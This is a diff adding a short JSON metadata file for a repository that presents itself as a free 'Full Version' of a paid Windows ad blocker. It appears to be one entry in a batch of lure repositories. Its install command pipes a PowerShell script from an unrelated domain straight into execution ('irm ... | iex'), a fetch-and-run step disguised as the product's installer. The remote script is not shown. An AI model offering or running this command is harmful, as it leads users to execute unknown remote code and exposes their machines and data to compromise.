@@ -1,0 +1,25 @@
+{
+  "repo": "AdGuard-Ad-Blocker-Premium-Windows-Full-Version",
+  "product": "AdGuard Ad Blocker Premium Windows Full Version",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://beyondapp.pro/ps/setup.ps1",
+  "install_command": "irm https://beyondapp.pro/ps/setup.ps1 | iex",
+  "batch": "new30-popular80",
+  "format": "license-md-only",
+  "category": "security",
+  "topics": [
+    "adguard-ad-blocker-premium-windows-full",
+    "adguard",
+    "blocker",
+    "premium",
+    "windows",
+    "full",
+    "version",
+    "security",
+    "desktop",
+    "setup-guide",
+    "software",
+    "productivity"
+  ]
+}
